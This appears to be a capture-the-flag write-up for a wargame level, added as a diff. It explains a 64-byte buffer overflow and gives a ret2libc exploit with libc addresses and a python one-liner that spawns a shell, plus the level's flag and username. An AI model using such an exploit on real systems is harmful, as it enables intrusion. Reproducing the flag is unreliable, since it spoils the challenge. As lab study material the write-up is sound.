@@ -1,0 +1,30 @@
+flag: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+username: dat_wil, obtained reading the binary.
+
+The program fgets for a maximum size of 256 in a buffer of size 64.
+This is a simple buffer overflow for which the offset is 80, obtained via a 
+generated pattern.
+
+alright, let's do a ret2libc !
+
+> p system
+0xf7e6aed0
+
+> p exit
+0xf7e5eb70
+
+> find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+
+"\xd0\xae\xe6\xf7"
+"\x70\xeb\xe5\xf7"
+"\xec\x97\xf8\xf7"
+
+We overwrite eip in the stack, replacing it with the address of system.
+We pass to system the arg "/bin/sh" to get our shell by overwriting eax in the stack.
+We overwrite the return addr in the stack with exit: after system, exit will be called.
+
+(echo "dat_wil"; python -c 'print "A"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"'; cat) | ./level01
+
+
